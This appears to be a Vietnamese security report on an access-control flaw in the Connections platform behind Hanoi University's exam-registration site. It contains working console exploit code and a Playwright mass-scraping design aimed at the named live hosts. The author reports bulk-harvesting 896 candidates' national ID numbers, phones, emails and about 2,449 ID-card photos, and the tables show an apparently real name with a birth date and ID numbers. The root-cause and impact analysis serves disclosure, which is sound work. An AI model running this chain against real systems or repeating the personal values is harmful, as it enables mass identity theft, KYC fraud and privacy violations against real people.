\section{Phương pháp Tấn công: Chuỗi Hoàn chỉnh}
\label{sec:attack}

\subsection{Tổng quan}

Chuỗi tấn công kết hợp nhiều kỹ thuật để leo thang từ một kết quả Google đơn lẻ đến việc trích xuất toàn bộ PII bao gồm cả ảnh chụp CCCD:

\begin{enumerate}
    \item \textbf{Google Dorking} (Trinh sát)
    \item \textbf{Phân tích Mã nguồn} (Nhận dạng Framework)
    \item \textbf{Dịch ngược JavaScript API} (Khám phá Schema)
    \item \textbf{Khai thác IDOR} (Duyệt CSDL)
    \item \textbf{Duyệt Khóa ngoại} (Truy cập liên bảng)
    \item \textbf{Trích xuất Metadata PDF} (Thu thập dữ liệu làm hạt giống - Seed Data)
    \item \textbf{Tiêm API qua Trình duyệt Headless}\footnote{Headless Browser: Trình duyệt web chạy ở chế độ nền, không có giao diện đồ họa (GUI), cho phép điều khiển tự động hóa (Ví dụ: Playwright, Puppeteer).} (Trích xuất hàng loạt)
    \item \textbf{Quét DOM} (Giải quyết tham chiếu + Thu thập ảnh)
    \item \textbf{Tải ảnh từ CDN} (Trích xuất ảnh CCCD)
\end{enumerate}

\subsection{Bước 1: Google Dorking - Phát hiện Ban đầu}

Một tìm kiếm Google thông thường chứa tên của một thí sinh và các từ khóa liên quan đến HANU đã trả về một liên kết trực tiếp đến trang web Trung tâm Khảo thí:

\begin{lstlisting}[language={},title={Kết quả tìm kiếm Google}]
TRUNG TAM KHAO THI - TRUONG DAI HOC HA NOI
https://tec.hanu.vn/7fdc5fa41f34577d4bba6b0d3e449385/1518250/2368M35018
"Phieu dang ky thi nang luc ngoai ngu..."
\end{lstlisting}

\noindent Trang web được render hiển thị đầy đủ phiếu đăng ký thi bao gồm số CCCD, ngày sinh, dân tộc, thông tin liên hệ, và ảnh chụp thẻ CCCD.

\subsection{Bước 2: Phân tích Mã nguồn - Xác định I\&E Việt Nam}

Kiểm tra mã nguồn trang cho thấy:
\begin{itemize}[noitemsep]
    \item JavaScript được tải từ \texttt{cdn.inevn.com} (I\&E Việt Nam)
    \item CSS được tải từ \texttt{thuctap.inevn.com}
    \item Lời gọi API đến \texttt{xhr.inevn.com} và \texttt{connections.hanu.vn}
    \item Cấu hình Framework nằm tại \texttt{tts.ine.vn/nguyendinhhuy}
    \item Tên các hàm bằng tiếng Việt (\texttt{xửLý}, \texttt{CĂN.db}, \texttt{config})
\end{itemize}

\subsection{Bước 3: Dịch ngược Framework JavaScript API}

Bằng cách sử dụng developer console của trình duyệt, tôi đã dò xét (probe) phạm vi toàn cục của framework:

\begin{lstlisting}[language=JavaScript,title={Thăm dò qua Console}]
> typeof xuLy       // "function" - trinh xu ly API chinh
> typeof CAN.db     // "function" - trinh tai co so du lieu
> typeof config     // "function" - trinh lay cau hinh
> typeof duLieu     // "object"   - ngu canh du lieu cua trang
> CAN               // {fn, khoa, lib, js, db, _db}
\end{lstlisting}

\noindent Bằng cách chặn bắt lưu lượng XHR trong tab Network khi tải một trang thí sinh, tôi đã quan sát được pattern yêu cầu/phản hồi:

\begin{lstlisting}[language={},title={Pattern Lưu lượng XHR}]
POST https://xhr.inevn.com/xhr/
  Request:  {action: "doiTuong.tai.7fdc5fa4...", d: {thuocTinh: {...}}}
  Response: ["1518250", "1518251", ...]  // Danh sach ID Doi tuong
\end{lstlisting}

\subsection{Bước 4: IDOR + Duyệt Khóa ngoại}

Với các hàm API đã được xác định, tôi khai thác IDOR để duyệt cơ sở dữ liệu:

\begin{lstlisting}[language=JavaScript,title={Khai thác từng bước}]
// 1. Tim bang Dang ky theo SBD (so bao danh tu file PDF)
xuLy("doiTuong.tai.7fdc5fa41f34577d4bba6b0d3e449385",
  {d: {thuocTinh: {"1642331": "AN1001"}}}, {}, function(ids) {
    console.log(ids); 
    // ["1518250"]
  });

// 2. Tai doi tuong Dang ky -> kham pha bang Thi sinh
CAN.db("7fdc5fa41f34577d4bba6b0d3e449385.1518250", function() {
  var reg = config("7fdc5fa41f34577d4bba6b0d3e449385.1518250");
  console.log(reg["1686869"]);  // "582319" (ID Thi sinh)
  // Ma bam bang Thi sinh duoc kham pha tu moi quan he khoa ngoai
});

// 3. Tai doi tuong Thi sinh -> truy cap TOAN BO du lieu ca nhan
CAN.db("3576ff3533bb456f8e394a0aa83a461f.582319", function() {
  var c = config("3576ff3533bb456f8e394a0aa83a461f.582319");
  console.log(c["1646777"]);  // "022202002576" (So CCCD)
  console.log(c["1626788"]);  // "0987654321"   (So dien thoai)
  console.log(c["1626793"]);  // "email@example.com"
  console.log(c["1626773"]);  // {"a^.":["146992"]}  (Tham chieu dan toc)
  console.log(c["1658487"]);  // {"i.":["4296"]}     (Anh CCCD mat truoc)
  console.log(c["1658488"]);  // {"i.":["243"]}      (Anh CCCD mat sau)
});
\end{lstlisting}

\subsection{Bước 5: Trích xuất Dữ liệu Hạt giống từ PDF}

Để liệt kê tất cả các thí sinh, tôi đã trích xuất danh sách số báo danh (SBD) từ 32 tệp PDF có thể truy cập công khai. Metadata của PDF được nhúng trong HTML của trang web dưới dạng một đối tượng JSON cache với các tên trường bằng tiếng Việt viết tắt. Sau khi unescape các đường dẫn mã hóa JSON, tất cả các tệp PDF đều có thể tải xuống từ CDN tập tin tĩnh tại \texttt{local.hanu.connections.vn}. Kết quả: \textbf{896 SBD duy nhất} được trích xuất từ 32 PDF.

\subsection{Bước 6: Trích xuất Hàng loạt Tự động}

Tôi đã phát triển một công cụ Python (\texttt{crawl\_hanu.py}) tự động hóa toàn bộ chuỗi sử dụng Playwright (trình duyệt Chromium headless):

\begin{lstlisting}[language=Python,title={Kiến trúc Trích xuất Lai (Hybrid Extraction Architecture)}]
# Moi worker chay 2 trang trinh duyet (pages):
#   api_page:    giu nguyen o /dangkythi de goi nhanh cac JS API
#   render_page: dieu huong den tung trang chi tiet cua thi sinh

def lookup_sbd(api_page, render_page, sbd):
    # Tra cuu API nhanh (~2 giay)
    reg_ids = _api_search(api_page, REG_TABLE, {F_SBD: sbd})
    reg_data = _api_load_object(api_page, REG_TABLE, reg_ids[0])
    cand_data = _api_load_object(api_page, CAND_TABLE, reg_data[F_CAND_ID])
    # -> CCCD, SDT, email, don vi cong tac luc nay da duoc lay

    # Render trang de lay cac tham chieu + hinh anh (~20 giay)
    render_page.goto(f"tec.hanu.vn/{REG_TABLE}/{reg_id}/{file_num}")
    # Cho doi thong minh (Smart wait): doi cho den khi chu "Dan toc" xuat hien
    # -> Trich xuat dan toc, noi sinh tu van ban DOM
    # -> Trich xuat URL hinh anh tu thuoc tinh background-image CSS
    # -> Tai cac anh chup CCCD tu CDN connections.vn
\end{lstlisting}

\subsection{Bước 7: Thực thi Song song với Điều chỉnh Tốc độ Thích ứng (Adaptive Throttling)}

Công cụ hỗ trợ \textbf{3 worker song song} theo mặc định, mỗi worker có instance trình duyệt Playwright riêng (để đảm bảo an toàn luồng - thread safety). Nếu server bắt đầu từ chối yêu cầu (3 lỗi liên tiếp), công cụ sẽ tự động lùi về sử dụng 1 worker duy nhất:

\begin{lstlisting}[language={},title={Song song Thích ứng}]
Workers: 3 (Mac dinh)
    |
    +-- Worker 1: Browser + 2 pages (api + render)
    +-- Worker 2: Browser + 2 pages (api + render)
    +-- Worker 3: Browser + 2 pages (api + render)
    |
[3 loi lien tiep tren bat ky worker nao]
    |
    v
Workers: 1 (Du phong - Fallback)
    +-- Worker 1: Browser + 2 pages (api + render)
\end{lstlisting}

\subsection{Bước 8: Xử lý Lỗi Uyển chuyển (Graceful Error Handling)}

Công cụ thực hiện nhiều cơ chế phục hồi mạnh mẽ:
\begin{itemize}
    \item \textbf{Xử lý Ctrl+C}: Khi bị ngắt, công cụ lập tức lưu tất cả dữ liệu đã thu thập vào CSV trước khi thoát.
    \item \textbf{Phục hồi lỗi mạng}: Khi bị timeout, công cụ tự thiết lập lại phiên trình duyệt và tiếp tục.
    \item \textbf{Lưu định kỳ}: Flush dữ liệu ra file CSV cứ sau mỗi 10 thí sinh để giảm thiểu mất mát dữ liệu.
    \item \textbf{Hỗ trợ tiếp tục (Resume)}: Khi khởi động lại, công cụ sẽ đọc tệp CSV hiện có và bỏ qua các SBD đã xử lý.
    \item \textbf{Cache tham chiếu}: Việc tra cứu Dân tộc và Nơi sinh được lưu vào cache (chỉ có khoảng $\sim$54 dân tộc và $\sim$63 tỉnh ở Việt Nam), vì vậy việc render trang trở nên không cần thiết đối với các ID tham chiếu đã gặp trước đó.
\end{itemize}

% ===================================================================
\section{Kết quả: Dữ liệu đã Trích xuất}
\label{sec:results}

\subsection{Khối lượng Dữ liệu}

\begin{table}[H]
\centering
\caption{Kết quả Trích xuất}
\begin{tabular}{@{}lr@{}}
\toprule
\textbf{Chỉ số} & \textbf{Giá trị} \\
\midrule
Tổng thí sinh (từ các PDF) & 896 \\
Thí sinh có CCCD được phân giải & 896 (100\%) \\
Thí sinh có thông tin dân tộc & 896 (100\%) \\
Thí sinh có thông tin nơi sinh & 896 (100\%) \\
Ảnh CCCD đã tải xuống & 2.600+ (ảnh thẻ + mặt trước + mặt sau) \\
Tỉ lệ thành công & 100\% \\
Worker sử dụng & 3 (chạy song song) \\
Tốc độ xử lý & $\sim$5 thí sinh/phút (bao gồm render trang) \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Các Trường Dữ liệu được Trích xuất trên mỗi Thí sinh}

\begin{table}[H]
\centering
\caption{Schema Bộ dữ liệu Hoàn chỉnh Đã trích xuất}
\begin{tabular}{@{}llll@{}}
\toprule
\textbf{Trường} & \textbf{Nguồn} & \textbf{Mức nhạy cảm} & \textbf{Ví dụ} \\
\midrule
SBD (số báo danh) & PDF & Thấp & AN1001 \\
Họ và Tên & API & Trung bình & Nguyễn Thị Linh Trà \\
Ngày sinh & API + PDF & Trung bình & 28/09/2000 \\
Giới tính & API + PDF & Thấp & Nữ \\
Số CCCD/CMND & API & \textbf{Nghiêm trọng} & 022202002576 \\
Số điện thoại & API & Cao & 0379822973 \\
Email & API & Cao & email@gmail.com \\
Nơi công tác & API & Trung bình & Văn bản tự do \\
Dân tộc & DOM render & Cao & Kinh \\
Nơi sinh & DOM render & Trung bình & Tỉnh Bắc Kạn \\
\textbf{Ảnh CCCD (mặt trước)} & \textbf{CDN} & \textbf{Nghiêm trọng} & \textbf{JPEG, 44--228 KB} \\
\textbf{Ảnh CCCD (mặt sau)} & \textbf{CDN} & \textbf{Nghiêm trọng} & \textbf{JPEG, 44--228 KB} \\
Điểm số & API + PDF & Trung bình & 8.5/6.0/5.5/7.0 \\
Mã hồ sơ (File number) & API & Thấp & 2368M35018 \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Cấu trúc Thư mục Đầu ra (Output)}

\begin{lstlisting}[language={},title={Thư mục Đầu ra (Output Directory)}]
output/
  candidates_phase1.csv     # 896 thi sinh (SBD, ten, ngay sinh, gioi tinh, diem)
  candidates_phase2.csv     # 896 thi sinh (+ CCCD, SDT, email, dan toc,
                            #   noi sinh, duong dan anh)
  candidates_full.csv       # Bo du lieu hoan chinh cuoi cung da hop nhat (gop cac truong)
  images/
    AN1001_front.jpg        # Anh CCCD mat truoc
    AN1001_back.jpg         # Anh CCCD mat sau
    AN1001_extra.jpg        # Anh the chan dung/anh bo sung cua thi sinh
    AN1002_front.jpg
    ...                     # Tong cong ~2.600 anh
  pdfs/                     # 32 PDF danh sach thi sinh goc
  file_index.json           # File Index Metadata cua PDF
\end{lstlisting}

% ===================================================================
\section{Phân tích Dữ liệu Chi tiết}
\label{sec:analysis}

Phần này trình bày phân tích thống kê đối với 896 bản ghi của thí sinh được trích xuất từ tệp \texttt{candidates\_phase2.csv}. Tất cả các số liệu thống kê đều được tính toán bằng lập trình từ dữ liệu thô.

\subsection{Nhân khẩu học}

\begin{itemize}[noitemsep]
    \item \textbf{Tổng số thí sinh}: 896 cá nhân duy nhất
    \item \textbf{Giới tính}: 661 Nữ (73.8\%), 235 Nam (26.2\%)
    \item \textbf{Độ tuổi (năm sinh)}: 1969--2005 (khoảng cách 37 năm)
    \item \textbf{Năm sinh trung vị}: $\approx$\,2000 (phổ biến nhất: 2000 với 234 thí sinh, tiếp theo là 1998 với 117 và 1999 với 102)
    \item Tỷ lệ nữ/nam là 3:1 và sự tập trung vào nhóm sinh năm 1998--2002 là hoàn toàn phù hợp với đặc thù của nhóm thí sinh thi năng lực ngoại ngữ tại một trường đại học chuyên về ngoại ngữ.
\end{itemize}

\subsection{Độ hoàn thiện của Dữ liệu}

\begin{table}[H]
\centering
\caption{Độ hoàn thiện dữ liệu ở cấp độ Trường (N=896)}
\begin{tabular}{@{}lrrr@{}}
\toprule
\textbf{Trường} & \textbf{Có dữ liệu} & \textbf{Bị trống} & \textbf{\% Điền} \\
\midrule
SBD (số báo danh) & 896 & 0 & 100.0\% \\
Họ và tên & 896 & 0 & 100.0\% \\
Ngày sinh & 896 & 0 & 100.0\% \\
Giới tính & 896 & 0 & 100.0\% \\
CCCD/CMND & 896 & 0 & 100.0\% \\
Số điện thoại & 896 & 0 & 100.0\% \\
Email & 896 & 0 & 100.0\% \\
Dân tộc & 818 & 78 & 91.3\% \\
Ảnh CCCD (mặt trước) & 820 & 76 & 91.5\% \\
Ảnh CCCD (mặt sau) & 816 & 80 & 91.1\% \\
Nơi sinh/Tỉnh thành & 576 & 320 & 64.3\% \\
Nơi công tác & 135 & 761 & 15.1\% \\
\bottomrule
\end{tabular}
\end{table}

\noindent 7 trường thông tin cá nhân (PII) cốt lõi (họ tên, ngày sinh, giới tính, CCCD, số điện thoại, email, mã hồ sơ) đều có tỷ lệ điền 100\%. Tỷ lệ điền thông tin nơi công tác thấp (15.1\%) cho thấy hầu hết thí sinh là sinh viên nên đã bỏ trống trường không bắt buộc này.

\subsection{Phân tích Tên miền Email}

\begin{table}[H]
\centering
\caption{Các Tên miền Email hàng đầu}
\begin{tabular}{@{}lrr@{}}
\toprule
\textbf{Tên miền} & \textbf{Số lượng} & \textbf{\%} \\
\midrule
\texttt{gmail.com} & 766 & 85.5\% \\
\texttt{s.hanu.edu.vn} & 87 & 9.7\% \\
\texttt{hanu.edu.vn} & 22 & 2.5\% \\
\texttt{yahoo.com} / \texttt{yahoo.com.vn} & 4 & 0.4\% \\
\texttt{gmail.con} \textit{(lỗi gõ phím)} & 3 & 0.3\% \\
Khác (\texttt{.edu.vn}, \texttt{.gov.vn}) & 14 & 1.6\% \\
\bottomrule
\end{tabular}
\end{table}

\noindent 3 trường hợp gõ sai thành \texttt{gmail.con} và 87 sinh viên sử dụng MSSV làm tiền tố cho email HANU (\texttt{\{mssv\}@s.hanu.edu.vn}) là những điểm đáng chú ý: các lỗi chính tả xác nhận đây là dữ liệu thật do người dùng tự nhập, trong khi mẫu email kia lại vô tình tạo ra một kênh thứ hai làm lộ số MSSV.

\subsection{Phân tích Định dạng CCCD/CMND}

Việt Nam đã phát hành tài liệu định danh dưới ba định dạng, tất cả đều xuất hiện trong tập dữ liệu này:

\begin{table}[H]
\centering
\caption{Phân bố Định dạng Giấy tờ tùy thân}
\begin{tabular}{@{}lrrp{5cm}@{}}
\toprule
\textbf{Định dạng} & \textbf{Số lượng} & \textbf{\%} & \textbf{Mô tả} \\
\midrule
CCCD 12 số & 474 & 52.9\% & Thẻ Căn cước công dân mới (sau 2021) \\
CMND 10 số & 271 & 30.2\% & Chứng minh nhân dân cũ (10 số) \\
CMND 9 số & 135 & 15.1\% & Chứng minh nhân dân cũ (9 số) \\
Độ dài khác & 16 & 1.8\% & Mã số sinh viên/Số hộ chiếu/Lỗi nhập liệu \\
\bottomrule
\end{tabular}
\end{table}

\noindent \textbf{Phát hiện 6 số CCCD bị trùng lặp} (mỗi số xuất hiện trong 2 lượt đăng ký), cho thấy có những thí sinh đã đăng ký thi nhiều lần. Điều này xác nhận rằng đây là các hồ sơ đăng ký thực tế, trải dài xuyên suốt trong giai đoạn từ tháng 9/2024 đến tháng 2/2026.

\subsection{Phân bố Địa lý}

3 chữ số đầu tiên của một CCCD 12 số mã hóa cho tỉnh thành nơi cấp. Trong số 474 CCCD định dạng mới:

\begin{table}[H]
\centering
\caption{Top 10 Tỉnh/Thành phố theo Mã vùng CCCD (N=474)}
\begin{tabular}{@{}llrr@{}}
\toprule
\textbf{Mã} & \textbf{Tỉnh/Thành phố} & \textbf{Số lượng} & \textbf{\%} \\
\midrule
001 & Hà Nội & 144 & 30.4\% \\
036 & Nam Định & 38 & 8.0\% \\
038 & Thanh Hoá & 36 & 7.6\% \\
034 & Thái Bình & 31 & 6.5\% \\
030 & Hải Dương & 25 & 5.3\% \\
024 & Bắc Giang & 23 & 4.9\% \\
035 & Hà Nam & 16 & 3.4\% \\
033 & Hưng Yên & 16 & 3.4\% \\
027 & Bắc Ninh & 15 & 3.2\% \\
037 & Ninh Bình & 15 & 3.2\% \\
\bottomrule
\end{tabular}
\end{table}

\noindent Sự phân bố tập trung rất cao ở khu vực Đồng bằng sông Hồng tại miền Bắc Việt Nam, phù hợp với vị trí của HANU tại Hà Nội. Riêng các thí sinh đến từ Hà Nội đã chiếm 30.4\% tổng số người sở hữu CCCD mẫu mới.

\subsection{Thống kê Kho Dữ liệu Ảnh}

\begin{table}[H]
\centering
\caption{Cơ cấu Hình ảnh được Tải xuống}
\begin{tabular}{@{}lrr@{}}
\toprule
\textbf{Loại ảnh} & \textbf{Số lượng} & \textbf{Mô tả} \\
\midrule
\texttt{*\_front.jpg} & 820 & Ảnh chụp mặt trước CCCD/CMND \\
\texttt{*\_back.jpg} & 816 & Ảnh chụp mặt sau CCCD/CMND \\
\texttt{*\_extra.jpg} & 813 & Ảnh thẻ chân dung của thí sinh \\
\midrule
\textbf{Tổng cộng} & \textbf{2.449} & \textbf{223\,MB trên ổ cứng} \\
\bottomrule
\end{tabular}
\end{table}

\noindent Khoảng 76--80 thí sinh bị thiếu ảnh rất có thể đã đăng ký từ trước khi quy định bắt buộc tải lên ảnh CCCD được áp dụng, hoặc họ đã tải lên các tài liệu ở định dạng không chuẩn khiến công cụ quét DOM không thể trích xuất được.

\subsection{Phân tích Nguồn PDF}

\begin{table}[H]
\centering
\caption{Phân bổ file PDF theo Đợt thi}
\begin{tabular}{@{}lrl@{}}
\toprule
\textbf{Thời gian} & \textbf{Số PDF} & \textbf{Loại kỳ thi} \\
\midrule
Tháng 9/2024 & 4 & C1 Tiếng Anh, Trung, Nhật, Hàn \\
Tháng 3/2025 & 4 & C1 Tiếng Anh, Trung, Nhật, Hàn \\
Tháng 5/2025 & 1 & Bài thi HANU Test \\
Tháng 6/2025 & 6 & NN2 SĐH (Ngoại ngữ 2 Sau đại học) \\
Tháng 10/2025 & 4 & Tiếng Anh, Trung, Nhật, Hàn \\
Tháng 1/2026 & 9 & Các ca thi Sáng/Chiều (nhiều ngày) \\
Tháng 2/2026 & 4 & Các ca thi Sáng/Chiều \\
\midrule
\textbf{Tổng cộng} & \textbf{32} & Giai đoạn: T9/2024 -- T2/2026 \\
\bottomrule
\end{tabular}
\end{table}

% ===================================================================
\section{Phân tích Nguyên nhân Gốc rễ (Root Cause)}
\label{sec:rootcause}

\subsection{Lỗi Kiến trúc trong Nền tảng Connections}

Việc lộ dữ liệu bắt nguồn từ những quyết định thiết kế kiến trúc cơ bản trong nền tảng Connections của I\&E Việt Nam:

\begin{enumerate}
    \item \textbf{Không có Tầng Xác thực API}: Các điểm cuối API XHR tại \texttt{xhr.inevn.com} và \texttt{connections.hanu.vn} chấp nhận yêu cầu từ bất kỳ ngữ cảnh thực thi JavaScript nào. Không có token, cookie phiên, hay kiểm tra API key nào.
    \item \textbf{Không có Kiểm soát Truy cập Cấp trường}: API trả về \textbf{toàn bộ các trường} cho bất kỳ đối tượng nào được yêu cầu. Một người dùng truy cập trang công khai để xem lịch thi sẽ nhận được toàn bộ dữ liệu giống hệt như một quản trị viên đang xem số CCCD và ảnh thẻ căn cước.
    \item \textbf{Lỗi IDOR (Tham chiếu đối tượng không an toàn) do Thiết kế}: ID đối tượng cơ sở dữ liệu được sử dụng trực tiếp trong URL và lời gọi API. Các mã băm bảng (table hashes) đóng vai trò định danh không cung cấp bảo mật - chúng lộ rành rành trên URL và có thể khám phá dễ dàng thông qua việc duyệt khóa ngoại.
    \item \textbf{Chỉ Bảo mật ở Phía Client (Client-Side)}: Toàn bộ logic nghiệp vụ và bộ lọc dữ liệu xảy ra tại JavaScript trên trình duyệt. Máy chủ đóng vai trò như một kho dữ liệu trong suốt, không thực thi bất kỳ kiểm soát truy cập nào.
    \item \textbf{Không có Kiểm soát trên CDN}: Cả CDN chứa tệp tĩnh và CDN chứa hình ảnh đều phân phối nội dung mà không cần xác thực. Khi một URL được biết (hoặc trích xuất từ trang đã render), bất kỳ HTTP client nào cũng có thể tải tệp xuống.
    \item \textbf{Không có Rate Limiting (Giới hạn Tốc độ)}: API chấp nhận hàng trăm truy vấn tuần tự từ một client duy nhất mà không bị "bóp băng thông" (throttling), cho phép trích xuất dữ liệu hàng loạt dễ dàng.
\end{enumerate}

\subsection{Rủi ro Nhà cung cấp Bên Thứ Ba (Third-Party Vendor Risk)}

HANU đã giao phó dữ liệu nhạy cảm của thí sinh - bao gồm các bức ảnh thẻ CCCD/CMND do nhà nước cấp - cho nền tảng Connections của I\&E Việt Nam. Điều này tạo ra một \textbf{lỗ hổng chuỗi cung ứng (supply chain vulnerability)}:

\begin{itemize}
    \item HANU có thể không hề hay biết nền tảng này hoàn toàn không có kiểm soát truy cập.
    \item Cùng một lỗi kiến trúc này khả năng cao sẽ ảnh hưởng tới \textbf{tất cả các tổ chức} đang sử dụng nền tảng Connections, không riêng gì HANU.
    \item HANU bị giới hạn khả năng tự triển khai các biện pháp kiểm soát bảo mật trên một hạ tầng không do họ vận hành.
    \item Mối quan hệ với nhà cung cấp đồng nghĩa với việc để khắc phục lỗ hổng này, I\&E Việt Nam phải thiết kế lại kiến trúc nền tảng của họ.
\end{itemize}

\subsection{Tại sao Mã hóa trên Image CDN Không phải là Bảo mật}

Image CDN sử dụng các đường dẫn URL được mã hóa (ví dụ: \texttt{kt3PG1hPTgTPG1MJ.u54.L8J...}), điều này bề ngoài có vẻ là để cung cấp tính năng bảo mật. Tuy nhiên:
\begin{itemize}
    \item Quá trình mã hóa được thực hiện bởi client-side JavaScript, thứ mà người dùng hoàn toàn kiểm soát được.
    \item Các URL đã mã hóa được nhúng trực tiếp dưới dạng thuộc tính \texttt{background-image} của CSS trong DOM, cực kỳ dễ trích xuất.
    \item Sau khi trích xuất, các URL này không yêu cầu cookie, token, hoặc header nào để tải hình ảnh.
    \item Bất kỳ trình duyệt headless nào cũng có thể render trang của thí sinh và tự động thu thập toàn bộ các URL hình ảnh đó.
\end{itemize}

% ===================================================================
\section{Đánh giá Tác động}
\label{sec:impact}

\subsection{Đối tượng Bị ảnh hưởng}

\begin{itemize}[noitemsep]
    \item \textbf{896 thí sinh duy nhất} đã được xác nhận từ các kỳ thi năm 2024.
    \item Cơ sở dữ liệu rất có thể chứa danh sách thí sinh từ \textbf{tất cả các kỳ thi trong lịch sử}, có khả năng lên đến hàng nghìn người.
    \item \textbf{Tất cả các thí sinh} đều có toàn bộ hồ sơ PII và ảnh chụp thẻ CCCD bị truy cập được mà không cần xác thực.
\end{itemize}

\subsection{Mức độ Nghiêm trọng: Sự Lộ lọt Hình ảnh thẻ CCCD}

Việc lộ lọt ảnh chụp thẻ CCCD/CMND nghiêm trọng hơn rất nhiều so với việc lộ thông tin cá nhân dưới dạng văn bản:

\begin{itemize}
    \item \textbf{Dữ liệu Sinh trắc học (Biometric data)}: Hình ảnh chứa khuôn mặt của chủ thẻ, thứ có thể bị sử dụng cho các cuộc tấn công nhận diện khuôn mặt.
    \item \textbf{Sao chép Thẻ (Physical card replication)}: Hình ảnh chất lượng cao của cả mặt trước và mặt sau cung cấp toàn bộ thông tin cần thiết để tạo ra thẻ căn cước giả.
    \item \textbf{Qua mặt KYC (KYC bypass)}: Nhiều dịch vụ tài chính tại Việt Nam chấp nhận ảnh chụp thẻ CCCD cho quy trình xác minh KYC (Know Your Customer) - những bức ảnh này có thể bị lợi dụng để mở tài khoản ngân hàng hoặc ví điện tử lừa đảo.
    \item \textbf{Sự không thể hoàn tác (Irreversibility)}: Khác với mật khẩu hoặc số điện thoại, một số thẻ CCCD và hình ảnh trên thẻ khi đã bị lộ thì không thể nào "đổi" được - hậu quả của nó là vĩnh viễn.
\end{itemize}

\subsection{Các Kịch bản Rủi ro}

\begin{enumerate}
    \item \textbf{Trộm cắp Danh tính Quy mô Lớn}: Số thẻ CCCD + Hình ảnh + Tên đầy đủ + Ngày sinh = một bộ hồ sơ danh tính hoàn chỉnh cho 896 cá nhân.
    \item \textbf{Gian lận Tài chính}: Ảnh thẻ CCCD có thể qua mặt hệ thống KYC tại các ngân hàng, ví điện tử (MoMo, ZaloPay, VNPay) và các sàn giao dịch tiền mã hóa.
    \item \textbf{Tấn công Tráo SIM (SIM Swap)}: Số điện thoại + Ảnh thẻ CCCD cho phép kẻ xấu thực hiện tấn công SIM swap với các nhà mạng, dẫn đến việc chiếm quyền điều khiển tài khoản (account takeovers).
    \item \textbf{Tạo Deepfake}: Hình ảnh khuôn mặt trích xuất từ CCCD, kết hợp với họ tên và thông tin tiểu sử, cho phép tạo ra các nội dung deepfake bằng AI phục vụ cho kỹ thuật phi kỹ thuật (social engineering).
    \item \textbf{Lừa đảo Nhắm mục tiêu (Targeted Phishing)}: Một bộ hồ sơ trọn vẹn (Tên, Email, Điện thoại, Nơi công tác, Lịch sử thi) cho phép tạo ra các chiến dịch lừa đảo spear-phishing cực kỳ tinh vi và thuyết phục.
    \item \textbf{Vi phạm Pháp luật \& Chế tài}: Chiếu theo Nghị định 13/2023/NĐ-CP về Bảo vệ dữ liệu cá nhân của Việt Nam, việc làm lộ thông tin căn cước công dân và hình ảnh sinh trắc học cấu thành vi phạm nghiêm trọng và có khả năng bị xử phạt.
\end{enumerate}

\subsection{Xếp hạng Mức độ Nghiêm trọng}

\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Yếu tố} & \textbf{Đánh giá} \\
\midrule
Độ Phức tạp của Tấn công & Thấp (Console trình duyệt + Script Python cơ bản) \\
Yêu cầu Xác thực & Không có \\
Độ Nhạy cảm của Dữ liệu & \textbf{Cực kỳ Nghiêm trọng} (ID quốc gia + ảnh) \\
Số lượng Người dùng bị ảnh hưởng & Hơn 896 người đã xác nhận, tiềm năng lên tới hàng nghìn \\
Khả năng Hoàn tác Dữ liệu & \textbf{Không thể đảo ngược} (Không thể thay CCCD) \\
Mức độ Khai thác & Dễ dàng (Không cần các công cụ chuyên dụng) \\
Phạm vi Nhà cung cấp & Toàn bộ khách hàng dùng chung nền tảng Connections \\
\textbf{Đánh giá Tổng thể} & \textbf{Mức Critical - Cực kỳ Nghiêm trọng (CVSS 9.1+)} \\
\bottomrule
\end{tabular}
\end{table}

% ===================================================================
\section{Các Thách thức Kỹ thuật và Giải pháp}
\label{sec:challenges}

\subsection{Render Nội dung Động (Dynamic Content Rendering)}

Trang web render tất cả dữ liệu phía client bằng JavaScript. Các request HTTP chuẩn (như \texttt{curl} hoặc \texttt{requests} trong Python) chỉ lấy về được bộ khung HTML trống.

\textbf{Giải pháp}: Sử dụng Playwright với trình duyệt Chromium headless để thực thi framework JavaScript, cho phép thực hiện cả việc gọi API và trích xuất DOM.

\subsection{Mã nguồn Tiếng Việt (Vietnamese-Language Code)}

Framework sử dụng các định danh tiếng Việt có dấu: \texttt{xửLý}, \texttt{dữLiệu}, \texttt{thuộcTính}, \texttt{đốiTượng}. Mặc dù đây không phải là một cách che giấu mã (obfuscation) có chủ ý, nó đòi hỏi các công cụ hỗ trợ Unicode và khiến việc pattern-matching (khớp chuỗi) khó khăn hơn đáng kể so với việc phân tích JavaScript thông thường.

\subsection{Giải quyết Trường Tham chiếu (Reference Field Resolution)}

Các trường Dân tộc và Nơi sinh lưu trữ các ID tham chiếu ẩn (VD: \texttt{\{"ậ":["146992"]\}}) thay vì văn bản. Những tham chiếu này \textbf{chỉ được giải quyết trong quá trình render trang} bởi logic nội bộ của framework - nếu gọi trực tiếp các API (\texttt{CĂN.db}, \texttt{config}, \texttt{thuộcTính.tải}), kết quả trả về cho các ID này luôn là \texttt{null}.

\textbf{Giải pháp}: Render toàn bộ trang của từng thí sinh và trích xuất các văn bản đã được giải quyết từ DOM (VD: ``4. Dân tộc: Kinh''). Tôi đã cache lại các giá trị này để tránh phải render lại trang nhiều lần.

\subsection{Mã hóa URL Ảnh (Image URL Encryption)}

Ảnh chụp CCCD được phân phối từ Image CDN với các đường dẫn URL đã được mã hóa, không thể tự xây dựng chỉ từ ID file - framework sinh ra chúng lúc runtime.

\textbf{Giải pháp}: Render trang của mỗi thí sinh, trích xuất URL từ thuộc tính \texttt{background-image} trong CSS từ các thẻ \texttt{<div>} đang trỏ về \texttt{connections.vn}, sau đó tải ảnh xuống qua HTTP GET.

\subsection{Xử lý Song song và An toàn Luồng (Parallelism and Thread Safety)}

API đồng bộ của Playwright không đảm bảo an toàn luồng (thread-safe) trên các instance trình duyệt dùng chung.

\textbf{Giải pháp}: Mỗi worker thread sẽ tự khởi chạy instance trình duyệt Playwright riêng của nó, với 2 trang (page) riêng biệt cho mỗi trình duyệt (một trang gọi API, một trang để render). Các worker được khởi động cách nhau 3 giây (staggered) để tránh hiện tượng "thundering herd" khi thiết lập session.

\subsection{Khả năng Phục hồi Mạng (Network Resilience)}

Server của HANU thường xuyên gặp tình trạng tải trang rất chậm (có khi mất hơn 30 giây).

